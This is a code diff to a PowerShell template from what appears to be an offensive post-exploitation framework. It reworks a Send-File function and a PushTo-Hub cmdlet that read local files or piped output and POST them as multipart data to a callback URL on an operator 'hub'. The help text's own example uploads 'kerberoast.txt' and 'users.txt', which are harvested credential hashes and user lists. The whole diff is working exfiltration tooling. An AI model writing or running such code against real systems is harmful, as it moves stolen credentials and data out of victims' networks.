@@ -325,7 +325,21 @@ function Send-File {
         "--$boundary--$LF"
     ) -join $LF
 
-    $response = Invoke-RestMethod -Uri $($CALLBACK_URL + "u?noredirect=1") -Method "POST" -ContentType "multipart/form-data; boundary=`"$boundary`"" -Body $bodyLines
+    # $response = Invoke-RestMethod -Uri $($CALLBACK_URL + "u?noredirect=1") -Method "POST" -ContentType "multipart/form-data; boundary=`"$boundary`"" -Body $bodyLines
+
+    $post_url = $($CALLBACK_URL + "u?noredirect=1")
+    {{'Write-Debug "POSTing the file to $post_url..."'|debug}}
+    $WebRequest = [System.Net.WebRequest]::Create($post_url)
+    $WebRequest.Method = "POST"
+    $WebRequest.ContentType = "multipart/form-data; boundary=`"$boundary`""
+    $PostStream = $WebRequest.GetRequestStream()
+    $BodyLines = [System.Text.Encoding]::ASCII.GetBytes($BodyLines)
+    $PostStream.Write($BodyLines, 0, $BodyLines.Length)
+    $PostStream.Close()
+    {{'Write-Debug "Reading response"'|debug}}
+    try {
+        $Response = $WebRequest.GetResponse()
+    } catch {}
 }
 
 
@@ -339,13 +353,14 @@ Uploads files back to the hub via Cmdlet.
 
 PushTo-Hub kerberoast.txt, users.txt
 
+Description
+-----------
+Upload the files 'kerberoast.txt' and 'users.txt' via HTTP back to the hub.
+
 .EXAMPLE
 
 Get-ChildItem | PushTo-Hub -Name "directory-listing"
 
-Description
------------
-Upload the files 'kerberoast.txt' and 'users.txt' via HTTP back to the hub.
 #>
     Param(
        [Parameter(Mandatory=$False)]
@@ -358,13 +373,15 @@ Upload the files 'kerberoast.txt' and 'users.txt' via HTTP back to the hub.
        $Stream
     )
 
-    {{'Write-Debug "Pushing $Files..."'|debug}}
-    begin { $result = @() }
+    begin {
+        $result = @()
+    }
     process {
         $result = $result + $Stream
     }
     end {
         if ($result) {
+            {{'Write-Debug "Pushing stdin stream..."'|debug}}
             if ($result.length -eq 1 -and $result[0] -is [System.String]) {
                 Send-File $result[0] $Name
             } else {
@@ -373,6 +390,7 @@ Upload the files 'kerberoast.txt' and 'users.txt' via HTTP back to the hub.
             }
         } else {
             ForEach ($file in $Files) {
+                {{'Write-Debug "Pushing $File..."'|debug}}
                 $abspath = (Resolve-Path $file).path
                 $fileBin = [System.IO.File]::ReadAllBytes($abspath)
                 $enc = [System.Text.Encoding]::GetEncoding("iso-8859-1")
